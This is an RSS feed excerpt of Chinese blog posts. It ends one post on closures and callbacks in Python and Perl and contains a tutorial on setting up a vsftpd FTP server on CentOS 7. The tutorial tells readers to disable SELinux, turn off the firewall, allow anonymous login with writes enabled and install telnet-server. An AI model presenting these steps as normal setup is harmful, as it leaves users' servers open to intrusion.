&lt;p&gt;在上面的示例中，x虽然是自由变量，但却在g()的定义之前就绑定了值(前文介绍过，它称为bound variable)，使得闭包a和闭包b持有的不再是自由变量，而是值对象完全相同的绑定变量，其值对象为3，a和b这个时候其实没有任何区别(虽然它们是不同对象)。换句话说，有了闭包a就完全没有必要再定义另一个功能上完全相同的闭包b。&lt;/p&gt;
&lt;p&gt;在函数复用性的角度上来说，这里的a和普通函数没有任何区别，都只是简单地复用了函数体。而真正严格意义上的闭包，除了复用函数体，还复用它所在的环境。&lt;/p&gt;
&lt;p&gt;但是这样一种情况，对于通俗定义的闭包来说，返回的g()也是一个闭包，但在严格定义的闭包中，这已经不算是闭包。&lt;/p&gt;
&lt;p&gt;再看一个示例：将自由变量x放在g()函数定义文本段的后面。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;def f(y):
    return x+y

x=1

def g(z):
    x=3
    return f(z)

print(g(1))   # 输出2，而不是4&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;首先要说明的是，python在没有给任何作用域修饰符的时候实现的词法作用域规则，所以上面&lt;code&gt;return f(z)&lt;/code&gt;中的f()看见的是全局变量x(因为f()定义在全局文本段中)，而不是g()中的x=3。&lt;/p&gt;
&lt;p&gt;回到闭包问题上。上面f()持有一个自由变量x，这个f(z)的文本定义段是在全局文本段中，它绑定的自由变量x是全局变量(声明并初始化为空或0)，但是这个变量之后赋值为1了。对于g()中返回的每个f()所在的环境来说，它持有的自由变量x一开始都是不确定的，但是后来都确定为1了。这种情况也不能称之为闭包，因为&lt;strong&gt;闭包是在f()对自由变量进行绑定时创建的&lt;/strong&gt;，而这个时候x已经是固定的值对象了。&lt;/p&gt;

&lt;p&gt;回调函数、闭包和匿名函数其实没有必然的关系，但因为很多书上都将匿名函数和回调函数、闭包放在一起解释，让人误以为回调函数、闭包需要通过匿名函数实现。实际上，匿名函数只是一个有函数定义文本段，却没有名称的函数，而闭包则是一个函数的实例加上一个环境(严格意义上的定义)。&lt;/p&gt;
&lt;p&gt;对于闭包和匿名函数来说，仍然以python为例：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;def f(x):
    def g(y):
        return x + y
    return g    # 返回一个闭包：有名称的函数

def h(x):
    return lambda y: x + y  # 返回一个闭包：匿名函数

# 将执行函数时返回的闭包函数赋值给变量
a = f(1)
b = h(1)

# 调用存储在变量中闭包函数
print (a(5))
print (b(5))&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对于回调函数和匿名函数来说，仍然以perl的find函数为例：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#!/usr/bin/perl
use File::Find;

$callback = sub {
    print &quot;$File::Find::name\n&quot;;
};  # 创建一个匿名函数以及它的引用

find( $callback,&quot;/tmp&quot; );  # 查找/tmp下的文件，每查找到一个文件，就执行一次$callback函数&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;匿名函数让闭包的实现更简洁，所以很多时候返回的闭包函数就是一个匿名函数实例。&lt;/p&gt;
</description>
<pubDate>Mon, 01 Oct 2018 14:20:00 +0000</pubDate>
<dc:creator>骏马金龙</dc:creator>
<og:description>堵车节第一天，我没有出门。把以前一直只限于知道，却不清晰理解的这几个概念完完整整地梳理了一番。内容参考自wiki页面，然后加上自己一些理解。 词法作用域和动态作用域 不管什么语言，我们总要学习作用域(</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/f-ck-need-u/p/9735955.html</dc:identifier>
</item>
<item>
<title>contos安装FTP服务 - 请叫我头头哥</title>
<link>http://www.cnblogs.com/toutou/p/9662390.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/toutou/p/9662390.html</guid>
<description>&lt;div class=&quot;bodyCustomClass&quot; readability=&quot;34.959915611814&quot;&gt;
&lt;blockquote readability=&quot;15.324894514768&quot;&gt;
&lt;p&gt;最近公司有一个内部比赛(&lt;a title=&quot;contos7安装FTP服务&quot; href=&quot;https://baike.baidu.com/item/%E9%BB%91%E5%AE%A2%E9%A9%AC%E6%8B%89%E6%9D%BE/8649956?fr=aladdin&quot; target=&quot;_blank&quot;&gt;黑客马拉松&lt;/a&gt;)，报名参加了这么一个赛事，在准备参赛作品的同时(参赛服务器需要自己搭建)，借着这个机会，决定把tomcat部署相关的知识从0到1重新捋一遍。就当备忘录了。&lt;/p&gt;
&lt;p&gt;FTP服务器（File Transfer Protocol Server）是在互联网上提供文件存储和访问服务的计算机，它们依照FTP协议提供服务。 FTP是File Transfer Protocol(文件传输协议)。顾名思义，就是专门用来传输文件的协议。简单地说，支持FTP协议的服务器就是FTP服务器。&lt;/p&gt;
&lt;p&gt;本文适用范围win10系统连接虚拟机&lt;a title=&quot;contos7安装FTP服务&quot; href=&quot;https://mirrors.btte.net/&quot; target=&quot;_blank&quot;&gt;contos&lt;/a&gt;, 博主使用的是&lt;a title=&quot;contos7安装FTP服务&quot; href=&quot;https://filezilla-project.org/&quot; target=&quot;_blank&quot;&gt;filezilla&lt;/a&gt;连接contos。若是其他方式仅供参考。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;h2 id=&quot;_nav_0&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;安装vsftpd&lt;/h2&gt;
&lt;p&gt;♛ 检查并安装&lt;/p&gt;
&lt;p&gt;确认虚拟机网络连接方式&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180918143806328-598556517.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;p&gt;尽量虚拟机和实体机在同一IP段，如实体机：192.168.122.1 虚拟机则：192.168.122.9&lt;/p&gt;
&lt;p&gt;确保实体机和虚拟机的ip可以互相ping通&lt;/p&gt;
&lt;p&gt;先查看你是否安装了vsftpd&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rpm -q vsftpd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180917180939455-127701551.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如上图，则未安装，若已安装，则显示例如 vsftpd-3.0.2-10.el7.x86_64&lt;/p&gt;
&lt;p&gt;未安装那就安装vsftpd&lt;/p&gt;
&lt;p&gt;&lt;code&gt;yum install -y vsftpd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180917180948508-656211918.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如上图，需要root权限&lt;/p&gt;
&lt;p&gt;&lt;code&gt;su root&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后输入密码，如下图，设置root权限成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180917180959705-565185050.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后继续安装&lt;code&gt;yum install -y vsftpd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;安装完毕，如下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180917181007364-740190114.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;p&gt;查看到安装的目录&lt;code&gt;whereis vsftpd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180917181016438-1314276588.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;p&gt;vsftpd目录为: /usr/sbin/vsftpd /etc/vsftpd /usr/share/man/man8/vsftpd.8.gz&lt;/p&gt;
&lt;p&gt;查看vsftpd服务的状态&lt;code&gt;systemctl status vsftpd.service&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180917181023098-1755952601.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;p&gt;开启vsftpd服务&lt;code&gt;systemctl start vsftpd.service&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;开启之后再查看vsftpd服务的状态&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180917181029589-666469319.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;p&gt;设置vsftpd服务开机自启&lt;code&gt;systemctl enable vsftpd.service&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180917181035980-1833853692.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;_nav_1&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;防火墙设置&lt;/h2&gt;
&lt;p&gt;防火墙添加FTP服务&lt;/p&gt;
&lt;p&gt;&lt;code&gt;systemctl enable firewalld&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;systemctl restart firewalld&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;firewall-cmd --permanent --zone=public --add-service=ftp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;firewall-cmd --reload&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;firewall-cmd --reload&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;设置SELinux&lt;/p&gt;
&lt;p&gt;&lt;code&gt;getsebool -a | grep ftp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;setsebool -P ftpd_full_access on&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180917181044299-899399948.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;p&gt;查看设置&lt;code&gt;vi /etc/selinux/config&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180917181050555-881269660.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;p&gt;设置&lt;code&gt;SELINUX=disabled&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;_nav_2&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;配置vsftpd.conf&lt;/h2&gt;
&lt;p&gt;配置之前先备份&lt;code&gt;cp /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf-bak&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;配置vsftpd.conf文件&lt;code&gt;vim /etc/vsftpd/vsftpd.conf&lt;/code&gt; 推荐使用vim方式，vi方式配置文件注释和实体没有颜色区分，会看花眼的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('d41f23c0-2a20-4bde-b326-974de2f1b156')&quot; readability=&quot;41&quot;&gt;&lt;img id=&quot;code_img_closed_d41f23c0-2a20-4bde-b326-974de2f1b156&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;img id=&quot;code_img_opened_d41f23c0-2a20-4bde-b326-974de2f1b156&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('d41f23c0-2a20-4bde-b326-974de2f1b156',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_d41f23c0-2a20-4bde-b326-974de2f1b156&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;77&quot;&gt;
&lt;pre&gt;
&lt;span&gt;# Example config file /etc/vsftpd/vsftpd.conf
#
# The default compiled in settings are fairly paranoid. This sample file
# loosens things up a bit, to make the ftp daemon more usable.
# Please see vsftpd.conf.5 for all compiled in defaults.
#
# READ THIS: This example file is NOT an exhaustive list of vsftpd options.
# Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd's
# capabilities.
#
# Allow anonymous FTP? (Beware - allowed by default if you comment this out).
anonymous_enable=YES
#
# Uncomment this to allow local users to log in.
# When SELinux is enforcing check for SE bool ftp_home_dir
local_enable=YES
#
# Uncomment this to enable any form of FTP write command.
write_enable=YES
#
# Default umask for local users is 077. You may wish to change this to 022,
# if your users expect that (022 is used by most other ftpd's)
local_umask=022
#
# Uncomment this to allow the anonymous FTP user to upload files. This only
# has an effect if the above global write enable is activated. Also, you will
# obviously need to create a directory writable by the FTP user.
# When SELinux is enforcing check for SE bool allow_ftpd_anon_write, allow_ftpd_full_access
#anon_upload_enable=YES
#
# Uncomment this if you want the anonymous FTP user to be able to create
# new directories.
#anon_mkdir_write_enable=YES
#
# Activate directory messages - messages given to remote users when they
# go into a certain directory.
dirmessage_enable=YES
#
# Activate logging of uploads/downloads.
xferlog_enable=YES
#
# Make sure PORT transfer connections originate from port 20 (ftp-data).
connect_from_port_20=YES
#
# If you want, you can arrange for uploaded anonymous files to be owned by
# a different user. Note! Using &quot;root&quot; for uploaded files is not
# recommended!
#chown_uploads=YES
#chown_username=whoever
#
# You may override where the log file goes if you like. The default is shown
# below.
#xferlog_file=/var/log/xferlog
#
# If you want, you can have your log file in standard ftpd xferlog format.
# Note that the default log file location is /var/log/xferlog in this case.
xferlog_std_format=YES
#
# You may change the default value for timing out an idle session.
#idle_session_timeout=600
#
# You may change the default value for timing out a data connection.
#data_connection_timeout=120
#
# It is recommended that you define on your system a unique user which the
# ftp server can use as a totally isolated and unprivileged user.
#nopriv_user=ftpsecure
#
# Enable this and the server will recognise asynchronous ABOR requests. Not
# recommended for security (the code is non-trivial). Not enabling it,
# however, may confuse older FTP clients.
#async_abor_enable=YES
#
# By default the server will pretend to allow ASCII mode but in fact ignore
# the request. Turn on the below options to have the server actually do ASCII
# mangling on files when in ASCII mode.
# Beware that on some FTP servers, ASCII support allows a denial of service
# attack (DoS) via the command &quot;SIZE /big/file&quot; in ASCII mode. vsftpd
# predicted this attack and has always been safe, reporting the size of the
# raw file.
# ASCII mangling is a horrible feature of the protocol.
#ascii_upload_enable=YES
#ascii_download_enable=YES
#
# You may fully customise the login banner string:
#ftpd_banner=Welcome to blah FTP service.
#
# You may specify a file of disallowed anonymous e-mail addresses. Apparently
# useful for combatting certain DoS attacks.
#deny_email_enable=YES
# (default follows)
#banned_email_file=/etc/vsftpd/banned_emails
#
# You may specify an explicit list of local users to chroot() to their home
# directory. If chroot_local_user is YES, then this list becomes a list of
# users to NOT chroot().
# (Warning! chroot'ing can be very dangerous. If using chroot, make sure that
# the user does not have write access to the top level directory within the
# chroot)
#chroot_local_user=YES
#chroot_list_enable=YES
# (default follows)
#chroot_list_file=/etc/vsftpd/chroot_list
#
# You may activate the &quot;-R&quot; option to the builtin ls. This is disabled by
# default to avoid remote users being able to cause excessive I/O on large
# sites. However, some broken FTP clients such as &quot;ncftp&quot; and &quot;mirror&quot; assume
# the presence of the &quot;-R&quot; option, so there is a strong case for enabling it.
#ls_recurse_enable=YES
#
# When &quot;listen&quot; directive is enabled, vsftpd runs in standalone mode and
# listens on IPv4 sockets. This directive cannot be used in conjunction
# with the listen_ipv6 directive.
listen=NO
#
# This directive enables listening on IPv6 sockets. By default, listening
# on the IPv6 &quot;any&quot; address (::) will accept connections from both IPv6
# and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6
# sockets. If you want that (perhaps because you want to listen on specific
# addresses) then you must run two copies of vsftpd with two configuration
# files.
# Make sure, that one of the listen options is commented !!
listen_ipv6=YES

pam_service_name=vsftpd
userlist_enable=YES
tcp_wrappers=YES&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;中文版的(来源于网络，侵权必删)：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('c92aad70-e8b7-4b91-8a9f-808e4409e988')&quot; readability=&quot;33&quot;&gt;&lt;img id=&quot;code_img_closed_c92aad70-e8b7-4b91-8a9f-808e4409e988&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;img id=&quot;code_img_opened_c92aad70-e8b7-4b91-8a9f-808e4409e988&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('c92aad70-e8b7-4b91-8a9f-808e4409e988',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_c92aad70-e8b7-4b91-8a9f-808e4409e988&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
&lt;span&gt;# 是否允许匿名登录FTP服务器，默认设置为YES允许
# 用户可使用用户名ftp或anonymous进行ftp登录，口令为用户的E-mail地址。
# 如不允许匿名访问则设置为NO
anonymous_enable=YES
# 是否允许本地用户(即linux系统中的用户帐号)登录FTP服务器，默认设置为YES允许
# 本地用户登录后会进入用户主目录，而匿名用户登录后进入匿名用户的下载目录/var/ftp/pub
# 若只允许匿名用户访问，前面加上#注释掉即可阻止本地用户访问FTP服务器
local_enable=YES
# 是否允许本地用户对FTP服务器文件具有写权限，默认设置为YES允许
write_enable=YES 
# 掩码，本地用户默认掩码为077
# 你可以设置本地用户的文件掩码为缺省022，也可根据个人喜好将其设置为其他值
#local_umask=022
# 是否允许匿名用户上传文件，须将全局的write_enable=YES。默认为YES
#anon_upload_enable=YES
# 是否允许匿名用户创建新文件夹
#anon_mkdir_write_enable=YES 
# 是否激活目录欢迎信息功能
# 当用户用CMD模式首次访问服务器上某个目录时，FTP服务器将显示欢迎信息
# 默认情况下，欢迎信息是通过该目录下的.message文件获得的
# 此文件保存自定义的欢迎信息，由用户自己建立
#dirmessage_enable=YES
# 是否让系统自动维护上传和下载的日志文件
# 默认情况该日志文件为/var/log/vsftpd.log,也可以通过下面的xferlog_file选项对其进行设定
# 默认值为NO
xferlog_enable=YES
# Make sure PORT transfer connections originate from port 20 (ftp-data).
# 是否设定FTP服务器将启用FTP数据端口的连接请求
# ftp-data数据传输，21为连接控制端口
connect_from_port_20=YES
# 设定是否允许改变上传文件的属主，与下面一个设定项配合使用
# 注意，不推荐使用root用户上传文件
#chown_uploads=YES
# 设置想要改变的上传文件的属主，如果需要，则输入一个系统用户名
# 可以把上传的文件都改成root属主。whoever：任何人
#chown_username=whoever
# 设定系统维护记录FTP服务器上传和下载情况的日志文件
# /var/log/vsftpd.log是默认的，也可以另设其它
#xferlog_file=/var/log/vsftpd.log
# 是否以标准xferlog的格式书写传输日志文件
# 默认为/var/log/xferlog，也可以通过xferlog_file选项对其进行设定
# 默认值为NO
#xferlog_std_format=YES
# 以下是附加配置，添加相应的选项将启用相应的设置
# 是否生成两个相似的日志文件
# 默认在/var/log/xferlog和/var/log/vsftpd.log目录下
# 前者是wu_ftpd类型的传输日志，可以利用标准日志工具对其进行分析；后者是vsftpd类型的日志
#dual_log_enable
# 是否将原本输出到/var/log/vsftpd.log中的日志，输出到系统日志
#syslog_enable
# 设置数据传输中断间隔时间，此语句表示空闲的用户会话中断时间为600秒
# 即当数据传输结束后，用户连接FTP服务器的时间不应超过600秒。可以根据实际情况对该值进行修改
#idle_session_timeout=600
# 设置数据连接超时时间，该语句表示数据连接超时时间为120秒，可根据实际情况对其个修改
#data_connection_timeout=120
# 运行vsftpd需要的非特权系统用户，缺省是nobody
#nopriv_user=ftpsecure
# 是否识别异步ABOR请求。
# 如果FTP client会下达“async ABOR”这个指令时，这个设定才需要启用
# 而一般此设定并不安全，所以通常将其取消
#async_abor_enable=YES
# 是否以ASCII方式传输数据。默认情况下，服务器会忽略ASCII方式的请求。
# 启用此选项将允许服务器以ASCII方式传输数据
# 不过，这样可能会导致由&quot;SIZE /big/file&quot;方式引起的DoS攻击
#ascii_upload_enable=YES
#ascii_download_enable=YES
# 登录FTP服务器时显示的欢迎信息
# 如有需要，可在更改目录欢迎信息的目录下创建名为.message的文件，并写入欢迎信息保存后
#ftpd_banner=Welcome to blah FTP service.
# 黑名单设置。如果很讨厌某些email address，就可以使用此设定来取消他的登录权限
# 可以将某些特殊的email address抵挡住。
#deny_email_enable=YES
# 当上面的deny_email_enable=YES时，可以利用这个设定项来规定哪些邮件地址不可登录vsftpd服务器
# 此文件需用户自己创建，一行一个email address即可
#banned_email_file=/etc/vsftpd/banned_emails
# 用户登录FTP服务器后是否具有访问自己目录以外的其他文件的权限
# 设置为YES时，用户被锁定在自己的home目录中，vsftpd将在下面chroot_list_file选项值的位置寻找chroot_list文件
# 必须与下面的设置项配合
#chroot_list_enable=YES
# 被列入此文件的用户，在登录后将不能切换到自己目录以外的其他目录
# 从而有利于FTP服务器的安全管理和隐私保护。此文件需自己建立
#chroot_list_file=/etc/vsftpd/chroot_list
# 是否允许递归查询。默认为关闭，以防止远程用户造成过量的I/O
#ls_recurse_enable=YES
# 是否允许监听。
# 如果设置为YES，则vsftpd将以独立模式运行，由vsftpd自己监听和处理IPv4端口的连接请求
listen=YES
# 设定是否支持IPV6。如要同时监听IPv4和IPv6端口，
# 则必须运行两套vsftpd，采用两套配置文件
# 同时确保其中有一个监听选项是被注释掉的
#listen_ipv6=YES
# 设置PAM外挂模块提供的认证服务所使用的配置文件名，即/etc/pam.d/vsftpd文件
# 此文件中file=/etc/vsftpd/ftpusers字段，说明了PAM模块能抵挡的帐号内容来自文件/etc/vsftpd/ftpusers中
#pam_service_name=vsftpd
# 是否允许ftpusers文件中的用户登录FTP服务器，默认为NO
# 若此项设为YES，则user_list文件中的用户允许登录FTP服务器
# 而如果同时设置了userlist_deny=YES，则user_list文件中的用户将不允许登录FTP服务器，甚至连输入密码提示信息都没有
#userlist_enable=YES/NO
# 设置是否阻扯user_list文件中的用户登录FTP服务器，默认为YES
#userlist_deny=YES/NO
# 是否使用tcp_wrappers作为主机访问控制方式。
# tcp_wrappers可以实现linux系统中网络服务的基于主机地址的访问控制
# 在/etc目录中的hosts.allow和hosts.deny两个文件用于设置tcp_wrappers的访问控制
# 前者设置允许访问记录，后者设置拒绝访问记录。
# 如想限制某些主机对FTP服务器192.168.57.2的匿名访问，编缉/etc/hosts.allow文件，如在下面增加两行命令：
# vsftpd:192.168.57.1:DENY 和vsftpd:192.168.57.9:DENY
# 表明限制IP为192.168.57.1/192.168.57.9主机访问IP为192.168.57.2的FTP服务器
# 此时FTP服务器虽可以PING通，但无法连接
tcp_wrappers=YES&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;编辑user_list文件，&lt;code&gt;vim /etc/vsftpd/user_list&lt;/code&gt; 允许test用户访问FTP   注意下图中默认&lt;code&gt;UsRistListDebug&lt;/code&gt;的设置。&lt;/p&gt;
&lt;p&gt;默认情况下可以不编辑user_list文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180917181100739-31158639.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;p&gt;按步骤操作以后，效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180917181109799-2001811124.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;p&gt;filezilla效果图如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180918143752660-2004036120.png&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;_nav_3&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;注意事项&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;确保关闭防火墙&lt;/span&gt;&lt;code&gt;systemctl stop firewalld&lt;/code&gt;（临时关闭）或者&lt;code&gt;systemctl disable firewalld&lt;/code&gt;(禁止开机启动)&lt;/li&gt;
&lt;li&gt;&lt;span&gt;查看是否安装telnet&lt;/span&gt;&lt;code&gt;rpm -qa | grep telnet&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;最好安装telnet&lt;/span&gt;&lt;code&gt;yum install telnet-server&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;FTP数字代码的意义&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('dc197504-29c4-4845-b611-f5b81420f13d')&quot; readability=&quot;32.5&quot;&gt;&lt;img id=&quot;code_img_closed_dc197504-29c4-4845-b611-f5b81420f13d&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;img id=&quot;code_img_opened_dc197504-29c4-4845-b611-f5b81420f13d&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('dc197504-29c4-4845-b611-f5b81420f13d',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;contos7安装FTP服务&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_dc197504-29c4-4845-b611-f5b81420f13d&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
&lt;span&gt;110 重新启动标记应答。
120 服务在多久时间内ready。
125 数据链路端口开启，准备传送。
150 文件状态正常，开启数据连接端口。
200 命令执行成功。
202 命令执行失败。
211 系统状态或是系统求助响应。
212 目录的状态。
213 文件的状态。
214 求助的讯息。
215 名称系统类型。
220 新的联机服务ready。
221 服务的控制连接端口关闭，可以注销。
225 数据连结开启，但无传输动作。
226 关闭数据连接端口，请求的文件操作成功。
227 进入passive mode。
230 使用者登入。
250 请求的文件操作完成。
257 显示目前的路径名称。
331 用户名称正确，需要密码。
332 登入时需要账号信息。
350 请求的操作需要进一部的命令。
421 无法提供服务，关闭控制连结。
425 无法开启数据链路。
426 关闭联机，终止传输。
450 请求的操作未执行。
451 命令终止:有本地的错误。
452 未执行命令:磁盘空间不足。
500 格式错误，无法识别命令。
501 参数语法错误。
502 命令执行失败。
503 命令顺序错误。
504 命令所接的参数不正确。
530 未登入。 
532 储存文件需要账户登入。
550 未执行请求的操作。
551 请求的命令终止，类型未知。
552 请求的文件终止，储存位溢出。 
553 未执行请求的的命令，名称不正确。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;其他参考资料：&lt;/p&gt;
&lt;div id=&quot;MySignature&quot; readability=&quot;9.0030211480363&quot;&gt;
&lt;p id=&quot;PSignature&quot;&gt;&lt;br/&gt;作　　者：&lt;strong&gt;&lt;span&gt;&lt;a href=&quot;http://www.cnblogs.com/toutou/&quot; target=&quot;_blank&quot;&gt;请叫我头头哥&lt;/a&gt;&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;出　　处：&lt;a title=&quot;请叫我头头哥&quot; href=&quot;http://www.cnblogs.com/toutou/&quot; target=&quot;_blank&quot;&gt;http://www.cnblogs.com/toutou/&lt;/a&gt;&lt;br/&gt;关于作者：专注于基础平台的项目开发。如有问题或建议，请多多赐教！&lt;br/&gt;版权声明：本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文链接。&lt;br/&gt;特此声明：所有评论和私信都会在第一时间回复。也欢迎园子的大大们指正错误，共同进步。或者&lt;a title=&quot;请叫我头头哥&quot; href=&quot;http://msg.cnblogs.com/msg/send/%E8%AF%B7%E5%8F%AB%E6%88%91%E5%A4%B4%E5%A4%B4%E5%93%A5&quot;&gt;直接私信&lt;/a&gt;我&lt;br/&gt;声援博主：如果您觉得文章对您有帮助，可以点击文章右下角&lt;strong&gt;&lt;span&gt;【&lt;a id=&quot;post-up&quot; href=&quot;javascript:void(0);&quot;&gt;推荐&lt;/a&gt;】&lt;/span&gt;&lt;/strong&gt;一下。您的鼓励是作者坚持原创和持续写作的最大动力！&lt;br/&gt;&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Mon, 01 Oct 2018 13:35:00 +0000</pubDate>
<dc:creator>请叫我头头哥</dc:creator>
<og:description>最近公司有一个内部比赛(黑客马拉松)，报名参加了这么一个赛事，在准备参赛作品的同时(参赛服务器需要自己搭建)，借着这个机会，决定把tomcat部署相关的知识从0到1重新捋一遍。就当备忘录了。 FTP服</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/toutou/p/9662390.html</dc:identifier>
</item>
<item>
<title>说说DBA职责和目标 - 挑战者V</title>
<link>http://www.cnblogs.com/youcong/p/9735738.html</link>
